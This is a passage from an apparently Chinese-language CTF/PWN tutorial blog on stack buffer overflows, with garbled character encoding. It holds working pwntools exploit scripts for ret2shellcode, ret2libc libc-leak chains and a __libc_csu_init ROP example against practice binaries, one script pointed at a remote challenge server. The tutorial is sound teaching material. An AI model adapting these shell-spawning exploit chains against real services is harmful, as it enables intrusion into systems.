<h5 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29955</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_n_5'</span>)</span><br><span class="line"><span class="comment">#è¿™å¥è¯éå¸¸é‡è¦,å› ä¸ºè®¾ç½®archå†³å®šäº†ğŸ‘‡shellçš„æ±‡ç¼–ç»“æœ,ä¸åŒarchä¸‹å¾—åˆ°çš„ç»“æœæ˜¯ä¸ä¸€æ ·çš„</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())<span class="comment">#ç”Ÿæˆ64ä½linuxshellcode</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">0x20</span> + <span class="string">b'a'</span>*<span class="number">8</span> + p64(<span class="number">0x601080</span>)<span class="comment">#æ ˆæº¢å‡ºretåˆ°shellcodeæ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">"name\n"</span>,shellcode)</span><br><span class="line">sh.sendlineafter(<span class="string">"me?\n"</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="2-return2libcâ€“æŒ‡å‘å†…å­˜ä¸­çš„å‡½æ•°-æ“ä½œç³»ç»Ÿå…³é—­ASLR"><a href="#2-return2libcâ€“æŒ‡å‘å†…å­˜ä¸­çš„å‡½æ•°-æ“ä½œç³»ç»Ÿå…³é—­ASLR" class="headerlink" title="2.return2libcâ€“æŒ‡å‘å†…å­˜ä¸­çš„å‡½æ•°(æ“ä½œç³»ç»Ÿå…³é—­ASLR)"></a>2.return2libcâ€“æŒ‡å‘å†…å­˜ä¸­çš„å‡½æ•°(æ“ä½œç³»ç»Ÿå…³é—­ASLR)</h4><ul>
<li><p>è·å–libcä¸­çš„systemå‡½æ•°çš„åœ°å€,ä½¿ç”¨gdb,ç»™mainå‡½æ•°æ‰“ä¸Šæ–­ç‚¹,ç„¶åä½¿ç”¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p system</span><br></pre></td></tr></table></figure>
<p>è¯¥æ–¹æ³•å¯ä»¥è·å–ä»»æ„libcå‡½æ•°çš„åœ°å€</p>
</li>
<li><p>è®¾ç½®systemå‡½æ•°è¿”å›åçš„åœ°å€,ä»¥åŠä¸ºsystemå‡½æ•°æ„é€ æˆ‘ä»¬é¢„å®šçš„å‚æ•°</p>
</li>
<li><p>ç”±äºæˆ‘ä»¬ä½¿ç”¨systemçš„å‡½æ•°åœ°å€æ›¿æ¢äº†åŸæœ¬çš„ipå¯„å­˜å™¨,å¼ºåˆ¶æ‰§è¡Œäº†systemå‡½æ•°.ç ´åäº†åŸç¨‹åºæ ˆæ¡¢åˆ†é…å’Œé‡Šæ”¾ç­–ç•¥,æ‰€ä»¥åç»­çš„æ“ä½œå¿…é¡»åŸºäºè¿™ä¸ªè¢«ç ´åçš„æ ˆæ¡¢ç»“æ„æ¥å®ç°</p>
</li>
<li><p>ä¾‹å¦‚ä¸‹é¢çš„payloadä¸­çš„padding2çš„æ“ä½œåº”è¯¥æ˜¯pop ip,ä¹Ÿå°±æ˜¯systemå‡½æ•°è°ƒç”¨å®Œæˆåéœ€è¦è¿”å›çš„åœ°å€</p>
<ul>
<li>ä¸ºä»€ä¹ˆå‘¢?<ul>
<li>å› ä¸ºåœ¨æ­£å¸¸æƒ…å†µä¸‹,å‡½æ•°æ˜¯é€šè¿‡callè¿›è¡Œè°ƒç”¨çš„,å› æ­¤åœ¨è¿›å…¥systemå‰,callæŒ‡ä»¤å·²ç»é€šè¿‡push ipå°†è¿”å›åœ°å€pushåˆ°å‡½æ•°è°ƒç”¨æ ˆä¸­,æ‰€ä»¥åœ¨æ­£å¸¸æƒ…å†µä¸‹retæŒ‡ä»¤popåˆ°ipçš„æ•°æ®å°±æ˜¯callæŒ‡ä»¤pushåˆ°æ ˆä¸­çš„æ•°æ®,ä¹Ÿå°±æ˜¯è¯´ä¸¤è€…æ˜¯æˆå¯¹å‡ºç°çš„</li>
<li>ä½†æ˜¯!!!!ç”±äºæˆ‘ä»¬æ˜¯ç›´æ¥é€šè¿‡è¦†ç›–ipçš„åœ°å€ä»è€Œè·³è½¬åˆ°systemå‡½æ•°,å¹¶æ²¡æœ‰ç»è¿‡callæŒ‡ä»¤çš„è°ƒç”¨,ä¹Ÿå°±æ˜¯å¹¶æ²¡æœ‰push ipçš„æ“ä½œ,ä½†æ˜¯systemå‡½æ•°å´ç…§å¸¸æ‰§è¡Œäº†retæŒ‡ä»¤çš„pop ipçš„æ“ä½œ.</li>
<li>å› æ­¤,ret æŒ‡ä»¤popåˆ°ipä¸­çš„åˆ°åº•æ˜¯å“ªä¸€å¤„çš„æ•°æ®å‘¢,ç­”æ¡ˆå°±æ˜¯padding2ä¸­çš„æ•°æ®,ä¹Ÿå°±æ˜¯æˆ‘ä»¬è‡ªå·±è®¾å®šçš„systemå‡½æ•°çš„è¿”å›åœ°å€</li>
</ul>
</li>
</ul>
</li>
<li><p>çŸ¥é“äº†systeméƒ¨åˆ†çš„payload,é‚£ä¹ˆå¦‚ä½•è·å¾—systemçš„åœ°å€ä»¥åŠbin/shçš„åœ°å€å‘¢?</p>
<ul>
<li><p>å¯ä»¥é€šè¿‡putsä¸getså‡½æ•°,getsé€ æˆæº¢å‡º,putsæ³„æ¼libcä¸­çš„systemä»¥åŠ/bin/shçš„åœ°å€</p>
<ul>
<li><p>binåœ¨soæ–‡ä»¶ä¸­çš„åœ°å€</p>
<ul>
<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -t x libc.so | grep bin</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>å¯æ‰§è¡Œçš„system(â€œ/bin/shâ€)åœ¨soæ–‡ä»¶ä¸­çš„åœ°å€</p>
<ul>
<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget  libc.so</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>ç”±äºæˆ‘ä»¬å¯ä»¥æ§åˆ¶æ ˆ,æ ¹æ®ropçš„æ€æƒ³,æˆ‘ä»¬éœ€è¦æ‰¾åˆ°çš„å°±æ˜¯pop rdi;ret å‰åŠæ®µç”¨äºç»™ç¬¬ä¸€ä¸ªå‚æ•°rdièµ‹å€¼,ååŠæ®µç”¨äºè·³åˆ°å…¶ä»–ä»£ç ç‰‡æ®µ</p>
<ul>
<li><p>å¦‚ä½•æ‰¾åˆ°å¯ä»¥èµ‹å€¼çš„å‚æ•°å‘¢?</p>
<ul>
<li><p>å¯ä»¥é€šè¿‡,ROPgadget,è¿™é‡Œçš„å€¼é€šå¸¸æ˜¯å›ºå®šçš„0x400833</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary file_name --only <span class="string">"pop|ret"</span> | grep rdi</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li>å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ payloadæ³„æ¼å‡ºputså‡½æ•°çš„çœŸå®åœ°å€</li>
</ul>
<ul>
<li><p>æœ‰äº†çœŸå®åœ°å€,æˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“ç¨‹åºä½¿ç”¨çš„libc,ç®—å‡ºlibcçš„åŸºå€</p>
<ul>
<li><p>è¿™é‡Œå¯ä»¥ä½¿ç”¨<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">LibcSearcher</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¸ºå·²æ³„éœ²çš„å®é™…åœ°å€,æˆ–æœ€å12ä½(æ¯”å¦‚ï¼šd90)ï¼Œintç±»å‹</span></span><br><span class="line">obj = LibcSearcher(<span class="string">"fgets"</span>, <span class="number">0X7ff39014bd90</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>çŸ¥é“äº†ç¨‹åºä½¿ç”¨çš„libc,ä»¥åŠputså‡½æ•°çš„çœŸå®åœ°å€,æˆ‘ä»¬å°±å¯ç®—å‡ºlibcçš„åŸºå€,å†é€šè¿‡åŸºå€åŠ åç§»å°±èƒ½å¾—åˆ°å‡½æ•°çš„çœŸå®åœ°å€</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc_base = <span class="number">0X7ff39014bd90</span> - obj.dump(<span class="string">"fgets"</span>)</span><br><span class="line">obj.dump(<span class="string">"system"</span>)        <span class="comment">#system åç§»</span></span><br><span class="line">obj.dump(<span class="string">"str_bin_sh"</span>)    <span class="comment">#/bin/sh åç§»</span></span><br><span class="line"><span class="comment">#systemçš„çœŸå®åœ°å€</span></span><br><span class="line">system_addr =libc_base +  obj.dump(<span class="string">"system"</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>è¿™é‡Œæœ‰å¯èƒ½ä¼šé‡åˆ°,åŒ¹é…ä¸åˆ°libcçš„é”™è¯¯,å¯ä»¥é€šè¿‡<a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc-database</a>,æ·»åŠ libc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./get  <span class="comment"># List categories</span></span><br><span class="line">./get ubuntu debian  <span class="comment"># Download Ubuntu's and Debian's libc, old default behavior</span></span><br><span class="line">./get all  <span class="comment"># Download all categories. Can take a while!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æˆ–è€…æ·»åŠ è‡ªèº«çš„libc</span></span><br><span class="line">./add /usr/lib/libc-2.21.so</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="å®ä¾‹-1"><a href="#å®ä¾‹-1" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h5><ul>
<li>64ä½</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn',25805)</span></span><br><span class="line">p = process(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line">elf = ELF(<span class="string">'ciscn_2019_c_1'</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">main_addr = <span class="number">0x400b28</span></span><br><span class="line">p.recvuntil(<span class="string">'!\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'\x00'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">print(<span class="string">"payload=====&gt;"</span>+str(payload))</span><br><span class="line">p.recvuntil(<span class="string">'ed\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'\n\n'</span>)</span><br><span class="line">puts_real_addr = u64(p.recvuntil(<span class="string">'\n'</span>, drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">print(<span class="string">'puts real addr ====&gt;'</span>+str(hex(puts_real_addr)))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_real_addr)</span><br><span class="line">libc_base = puts_real_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">print(<span class="string">'libc_base====&gt;'</span>+str(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"system ====&gt;"</span>+str(hex(system)))</span><br><span class="line">print(<span class="string">"bin_sh ====&gt;"</span>+str(hex(bin_sh)))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'\x00'</span>*<span class="number">0x58</span> +p64(ret)+ p64(pop_rdi) + p64(bin_sh) + p64(system) </span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>32ä½</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28001</span>)</span><br><span class="line"><span class="comment">#r=process('./pwn')</span></span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">read_got=elf.got[<span class="string">'read'</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">'read'</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æº¢å‡ºæ§åˆ¶è¿”å›å€¼v5</span></span><br><span class="line">payload1=<span class="string">b'\x00'</span>+<span class="string">b'a'</span>*<span class="number">6</span>+<span class="string">b'\xff'</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">'Correct\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ³„æ¼libc</span></span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0xeb</span></span><br><span class="line">payload+=p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">'[+]read_addr: '</span>,hex(read_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#è®¡ç®—libc_baseï¼Œsystem_addrï¼Œbin_sh_addr</span></span><br><span class="line">libc=LibcSearcher(<span class="string">'read'</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">'read'</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œpayload</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">'Correct\n'</span>)</span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0xe7</span>+<span class="string">b'b'</span>*<span class="number">0x4</span></span><br><span class="line">payload+=p32(system_addr)*<span class="number">2</span>+p32(bin_sh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>payload = padding1 + address of system() + padding2 + address of â€œ/bin/shâ€</li>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027214118134.png" alt=""></li>
<li>Padding1 éšæ„å¡«å……,==é•¿åº¦åˆšå¥½è¦†ç›–åŸºåœ°å€==<ul>
<li>é•¿åº¦ä¸shellcodeå¤„çš„ä¸€æ ·çš„æ–¹æ³•</li>
</ul>
</li>
<li>address of system() æ˜¯systemåœ¨å†…å­˜ä¸­çš„åœ°å€,==ç”¨æ¥è¦†ç›–è¿”å›åœ°å€==<ul>
<li>system()å‡½æ•°åœ°å€åœ¨å“ªé‡Œ?<ul>
<li>ä»åŠ¨æ€åº“ä¸­è·å–,è®¡ç®—ç»å¯¹åœ°å€</li>
</ul>
</li>
</ul>
</li>
<li>padding2 æ•°æ®é•¿åº¦åº”è¯¥ä¸º ==4== (32ä½æœº) ç”±äºä¸å…³å¿ƒé€€å‡ºshellåçš„è¡Œä¸º,å¯éšæ„å¡«<ul>
<li>âš ï¸å½“éœ€è¦å¤šæ¬¡ç»•è¿‡æ—¶,è¿™é‡Œåº”è¯¥å¡«å……systemæ‰§è¡Œåéœ€è¦è¿”å›çš„åœ°å€,å¦åˆ™ç¨‹åºæ ˆä¼šå´©æºƒ</li>
</ul>
</li>
<li>address of  â€/bin/shâ€œ æ˜¯å­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„åœ°å€,ä½œä¸ºä¼ ç»™systemçš„å‚æ•°<ul>
<li>å­—ç¬¦ä¸²å“ªé‡Œæ‰¾?<ul>
<li>åŠ¨æ€åº“æœç´¢,è®¡ç®—ç»å¯¹åœ°å€</li>
<li>æ²¡æœ‰å°±å°†å…¶åŠ å…¥ç¯å¢ƒå˜é‡,é€šè¿‡getenv()å‡½æ•°è·å–</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-ROP-å¼€å¯NXæ—¶å¯ç”¨-â€“æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸæ®µæŒ‡ä»¤"><a href="#3-ROP-å¼€å¯NXæ—¶å¯ç”¨-â€“æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸæ®µæŒ‡ä»¤" class="headerlink" title="3.ROP(å¼€å¯NXæ—¶å¯ç”¨)â€“æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸæ®µæŒ‡ä»¤"></a>3.ROP(å¼€å¯NXæ—¶å¯ç”¨)â€“æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸæ®µæŒ‡ä»¤</h4><ul>
<li><p>payload = padding + address of gadget</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201029152817870.png" alt=""></p>
</li>
</ul>
<p>  <img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201029153008692.png" alt=""></p>
<p>  â€‹    </p>
<ul>
<li><p>ROPçš„å¸¸è§æ‹¼å‡‘æ•ˆæœæ˜¯å®ç°ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨</p>
</li>
<li><p>å¦‚ä½•å¯»æ‰¾æŒ‡ä»¤ç‰‡æ®µ?</p>
<ul>
<li>ä½¿ç”¨å·¥å…·å¯»æ‰¾ä»¥retç»“å°¾çš„ç‰‡æ®µ</li>
</ul>
</li>
<li><p>å¦‚ä½•å¯»æ‰¾ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°?</p>
<ul>
<li>å¯ä»¥ä½¿ç”¨popæŒ‡ä»¤å°†æ ˆé¡¶æ•°æ®å­˜å…¥å¯„å­˜å™¨</li>
<li>å¦‚æœå†…å­˜ä¸­æœ‰å¯ä»¥ç”¨moveæŒ‡ä»¤è¿›è¡Œä¼ è¾“</li>
</ul>
</li>
<li><p>å¯¹äºå•ä¸ªgadget,popæ‰€ä¼ è¾“çš„æ•°æ®å› è¯¥åœ¨gadgetåœ°å€ä¹‹å</p>
<ul>
<li>å…·ä½“çš„ROPä¾‹å­<ul>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201030080246816.png" alt=""></li>
</ul>
</li>
</ul>
</li>
<li><p>é€‚ç”¨äºé¢˜ç›®ä¸­æ²¡æœ‰ç»™å‡ºä»»ä½•æœ‰å…³cat flagæœ‰å…³ä¿¡æ¯,å¹¶ä¸”é¢˜ç›®ä¸­ä¹Ÿæ²¡æœ‰ä»»ä½•ä¸systemæœ‰å…³çš„å‡½æ•°</p>
<ul>
<li>æ­¤æ—¶éœ€è¦æˆ‘ä»¬leaké™¤libcå‡½æ•°çš„åœ°å€,å†é€šè¿‡libcæ„é€ ROP</li>
</ul>
</li>
</ul>
<h4 id="3-2-ä¸­çº§ROP"><a href="#3-2-ä¸­çº§ROP" class="headerlink" title="3.2 ä¸­çº§ROP"></a>3.2 ä¸­çº§ROP</h4><ul>
<li><p>ret2_libc_csu_init</p>
<ul>
<li><p>åœ¨64ä½ç¨‹åºä¸­ï¼Œå‡½æ•°çš„å‰å…­ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ å‚çš„ï¼Œä½†æ˜¯å¤§å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°æ¯ä¸ªå¯„å­˜å™¨å¯¹åº”çš„gadgetsï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥ç”¨x64ä¸‹çš„__libc_csu_initä¸­çš„gadgetsã€‚è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥å¯¹libcè¿›è¡Œåˆå§‹åŒ–æ“ä½œçš„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
<ul>
<li>è¿™é‡Œå¦‚æœå·§å¦™çš„æ§åˆ¶==rbx==ä¸==r12==,æˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„å‡½æ•°.ä¾‹å¦‚è®¾ç½®rbx=0,r12ä½å­˜å‚¨æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„å‡½æ•°çš„åœ°å€.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="å®ä¾‹-2"><a href="#å®ä¾‹-2" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ciscn_s_3"</span>)</span><br><span class="line">context.log_level 